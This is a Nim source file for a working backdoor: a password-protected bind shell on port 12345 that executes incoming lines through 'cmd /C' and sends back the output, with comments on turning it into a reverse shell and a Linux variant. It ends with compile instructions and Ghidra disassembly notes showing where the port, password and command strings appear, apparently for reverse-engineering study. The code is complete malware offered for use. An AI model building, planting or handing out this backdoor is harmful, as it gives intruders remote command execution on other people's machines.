import std/[net, threadpool, osproc]

let socket = newSocket()
socket.bindAddr(Port(12345))
socket.listen()

var client: Socket
var address: string

while true:
  socket.acceptAddr(client, address)                    # socket.connect(ip,Port(port)) for reverse shell
  client.send("Password?\n")

  if client.recvLine() == "thisIsMyPassword":           # If password isn't correct just keep connected
    while true:                                         #       for the confusion.  
      let message = ^spawn client.recvLine()            # Using spawn threading to avoid I/O blocking. Parallelism
      if message.len == 0:                              # When user disconnects 0 returns
        client.close()
        break                                           # Break out of first while loop and restart
      var (results, _) = execCmdEx("cmd /C" & message)  # /bin/sh -c for linux
      client.send(results)                              # Sending back results to client



#[

Compile: nim c -d:release --threads:on --out:"backdoor" -r "backdoor.nim"

Static analysing with Ghidra:

1)  Main in nim is called NimMainModule. It's what I've observed with different type of compile options.
2)  Nim compiles functions readable. To find the port you just have to search for bindAddr. The port is pushed to EDX in Hex. 

       14001b96b ba 39 30        MOV        EDX,0x3039
                 00 00
       14001b970 4c 89 25        MOV        qword ptr [socket__backdoor_4],R12               = ??
                 89 57 08 00
       14001b977 48 8d 74        LEA        RSI=>local_68,[RSP + 0x50]
                 24 50
       14001b97c 48 8d 1d        LEA        RBX,[message__backdoor_56]                       = ??
                 65 57 08 00
       14001b983 e8 98 9a        CALL       bindAddr__pureZnet_421                           undefined bindAddr__pureZnet_421
                 ff ff
3)  The first 8 bytes of ThisIsMyPassword is moved to RCX in reverse. The other half is stored in RDX. 
    Then returns a bool after being xorred.

       14001ba17 48 83 38 10     CMP        qword ptr [RAX],0x10
       14001ba1b 75 95           JNZ        LAB_14001b9b2
       14001ba1d 48 b9 74        MOV        RCX,0x794d734973696874
                 68 69 73 
                 49 73 4d 79
       14001ba27 48 8b 50 18     MOV        RDX,qword ptr [RAX + 0x18]
       14001ba2b 48 33 48 10     XOR        RCX,qword ptr [RAX + 0x10]
       14001ba2f 4c 31 f2        XOR        RDX,R14
       14001ba32 48 09 ca        OR         RDX,RCX

4)  CMD /C message is split being split by the compiler. It then memcpy all the strings before sending the results
    to execCmdEx for executing shell commands. The results is being pushed into RAX before being send back. 


       14001ba9f 66 89 50 04     MOV        word ptr [RAX + 0x4],DX
       14001baa3 c7 00 63        MOV        dword ptr [RAX],0x20646d63
                 6d 64 20


       14001bad3 e8 a8 72        CALL       memcpy                                           void * memcpy(void * _Dst, void 
       14001bad8 49 8b 07        MOV        RAX,qword ptr [R15]

                 00 00

       14001bb09 e8 b2 f2        CALL       execCmdEx__pureZosproc_1135                      undefined execCmdEx__pureZosproc
                 ff ff
       14001bb0e 48 8d 05        LEA        RAX,[results__backdoor_57]                       = ??
                 cb 55 08 00

]#